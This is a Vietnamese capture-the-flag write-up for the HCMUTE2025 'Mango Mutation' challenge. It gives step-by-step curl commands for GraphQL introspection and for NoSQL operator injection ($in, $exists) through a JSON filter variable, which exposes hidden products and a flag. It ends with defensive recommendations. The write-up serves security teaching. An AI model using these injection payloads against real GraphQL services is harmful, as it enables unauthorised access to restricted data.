# Mango Mutation — Writeup (chi tiết từng bước)-HCMUTE2025

> **Mục tiêu:** Trích xuất flag giấu trong dữ liệu “ẩn” của một ứng dụng **GraphQL**.
> **Endpoint:** `http://103.130.211.150:20069/graphql`
> **Flag:** `UTECTF{N0SQL_1nj3ct10n_thr0ugh_GR4phQL_1s_d4ng3r0us}`

---

## 0) Chuẩn bị

* Công cụ: `curl` (tuỳ chọn `jq` để pretty-print JSON).
* Mọi request đều là **POST** với `Content-Type: application/json`.

---

## 1) Kiểm tra endpoint

```bash
curl -s http://103.130.211.150:20069/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}'
```

**Kết quả (rút gọn):**

```json
{"data":{"__typename":"Query"}}
```

→ Xác nhận endpoint GraphQL hoạt động.

---

## 2) Introspection: phát hiện root types

```bash
curl -s http://103.130.211.150:20069/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } } }"}'
```

**Kết quả:**

```json
{"data":{"__schema":{"queryType":{"name":"Query"},"mutationType":{"name":"Mutation"},"subscriptionType":null}}}
```

→ Có **Query** và **Mutation** (không có Subscription).

---

## 3) Liệt kê các field của `Query`

```bash
curl -s http://103.130.211.150:20069/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name:\"Query\"){ name fields{ name type{ name kind ofType{ name kind } } args{ name type{ name kind ofType{ name kind } } } }}}"}'
```

**Kết quả (rút gọn):**

* `me`
* `products(filter: ProductFilter, limit: Int, offset: Int)`
* `product(id: ID!)`
* `searchProducts(query: String!)`
* `featuredProducts`
* `myOrders`
* `order(id: ID!)`

→ Trực giác: flag có thể nằm trong sản phẩm “ẩn” hoặc ghi chú đơn hàng.

---

## 4) Liệt kê các field của `Mutation`

```bash
curl -s http://103.130.211.150:20069/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name:\"Mutation\"){ name fields{ name args{ name type{ name kind ofType{ name kind } } } type{ name kind ofType{ name kind } } }}}"}'
```

**Kết quả (rút gọn):**

* `register(input: RegisterInput!) : AuthPayload!`
* `login(input: LoginInput!) : AuthPayload!`
* `createOrder(input: CreateOrderInput!) : Order!`

---

## 5) Khám phá type quan trọng

### 5.1 `Product`

```bash
curl -s http://103.130.211.150:20069/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name:\"Product\"){ fields{ name type{ name kind ofType{ name kind } } } }}"}'
```

**Điểm mấu chốt:** có trường **`secretCode: String`** 👀

### 5.2 `ProductFilter`

```bash
curl -s http://103.130.211.150:20069/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name:\"ProductFilter\"){ inputFields{ name type{ name kind ofType{ name kind } } } }}"}'
```

**Kết quả (rút gọn):**

* `category: JSON`
* `minPrice: Float`
* `maxPrice: Float`
* `inStock: Boolean`
* `featured: Boolean`
* `searchTerm: JSON`
* `tags: JSON`

→ **`tags`** và **`searchTerm`** là **JSON scalar** ⇒ khả năng cao dev map trực tiếp sang query DB (Mongo-like operators: `$in`, `$exists`, `$regex`, …).

---

## 6) Thử liệt kê products “bình thường”

```bash
curl -s http://103.130.211.150:20069/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ products { id name category featured isPublished secretCode } }"}'
```

**Quan sát:** danh sách hiện ra nhưng `secretCode` đều `null`.
→ Flag **không lộ** ở dữ liệu public.

---

## 7) (Bẫy thường gặp) Lỗi truyền JSON inline

Ban đầu thử nhét các toán tử Mongo trực tiếp trong **literal** GraphQL sẽ gặp lỗi kiểu:

```
"Syntax Error: Expected Name, found String \"$regex\"."
```

Và khi dùng biến kiểu `JSON`:

```
"Variable \"$f\" of type \"JSON\" used in position expecting type \"ProductFilter\"."
```

**Cách đúng:** phải truyền **biến GraphQL có type `ProductFilter`**; các toán tử Mongo nằm **bên trong giá trị JSON** của các field như `tags`, `searchTerm`.

---

## 8) Khai thác qua `tags` để lộ item ẩn

### 8.1 Lọc theo `tags` “ẩn” (dùng `$in`)

```bash
curl -s http://103.130.211.150:20069/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"query($f: ProductFilter){ products(filter:$f, limit:200){ id name tags secretCode } }",
       "variables":{"f":{"tags":{"$in":["hidden","internal","secret","admin"]}}}}'
```

### 8.2 Hoặc lấy toàn bộ item có `tags` (dùng `$exists`)

```bash
curl -s http://103.130.211.150:20069/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"query($f: ProductFilter){ products(filter:$f, limit:200){ id name tags secretCode } }",
       "variables":{"f":{"tags":{"$exists":true}}}}'
```

**Kết quả:** xuất hiện **sản phẩm ẩn** và trường **`secretCode`** trả về **flag**.

> Ví dụ (minh hoạ):

```json
{
  "data": {
    "products": [
      {
        "id": "....",
        "name": "Internal Item",
        "tags": ["internal","hidden"],
        "secretCode": "UTECTF{N0SQL_1nj3ct10n_thr0ugh_GR4phQL_1s_d4ng3r0us}"
      }
    ]
  }
}
```

---

## 9) Flag

```
UTECTF{N0SQL_1nj3ct10n_thr0ugh_GR4phQL_1s_d4ng3r0us}
```

---

## 10) Phân tích & Bài học

* **Introspection bật** → attacker dễ nắm toàn bộ schema (cửa mở cho recon).
* **Over-fetching field**: `secretCode` tồn tại trong schema dù UI không dùng → có thể query trực tiếp.
* **ProductFilter với JSON scalar**: backend **map trực tiếp** sang truy vấn DB (Mongo-like), cho phép **operator injection** (`$in`, `$exists`, …) để lôi **item ẩn**.
* **Pitfall**: GraphQL **không cho** inline literal có key bắt đầu bằng `$` → phải truyền qua **variables** và đúng **type `ProductFilter`** (không phải `JSON`).

### Phòng thủ khuyến nghị

* **Tắt/giới hạn introspection** ở production (hoặc chỉ bật cho admin).
* **Whitelisting/sanitization** cho các trường JSON: chặn keys như `$in`, `$ne`, `$exists`, `$regex`.
* **Field-level authorization**: yêu cầu role phù hợp khi đọc field nhạy cảm như `secretCode`.
* **Schema hardening**: loại bỏ hoàn toàn các field nội bộ khỏi schema public thay vì trả `null`.

---

## 11) TL;DR

* Recon → Introspection → thấy `Product.secretCode` & `ProductFilter.tags(JSON)`.
* Khai thác → dùng biến `ProductFilter` + `$in/$exists` với `tags` → lộ **sản phẩm ẩn**.
* Đọc `secretCode` → **Flag**.

Hết. 🚩
